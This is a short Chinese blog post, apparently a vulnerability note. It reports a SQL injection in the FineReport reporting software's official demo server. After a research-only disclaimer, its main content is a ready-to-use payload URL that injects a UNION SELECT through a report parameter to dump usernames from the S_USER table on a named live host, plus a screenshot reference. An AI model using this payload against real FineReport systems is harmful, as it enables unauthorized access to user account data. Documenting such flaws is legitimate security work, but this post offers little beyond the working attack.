---

title: 帆软FineReport 官网DEMO SQL注入
password: 13245687
abstract: 该文章已受密码保护, 请您输入密码查看。
message: 该文章已受密码保护, 请您输入密码查看。
wrong_pass_message: 密码不正确，请重新输入！
wrong_hash_message: 文章不能被校验, 不过您还是能看看解密后的内容！
tags: Vul
typora-root-url: ../
date: 2020-09-13 11:09:58
---

本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。

<div style="text-align: right"> 小维</div>



#### Payload

```
http://finereporthelp.com:8889/demo/ReportServer?reportlet=/demo/parameter/number1.cpt&para=1%20UNION%20SELECT%20null,%20username%20from%20S_USER%20%20--
```

![image-20200912153014529](/img/%E5%B8%86%E8%BD%AFFineReport-%E5%AE%98%E7%BD%91DEMO-SQL%E6%B3%A8%E5%85%A5/image-20200912153014529.png)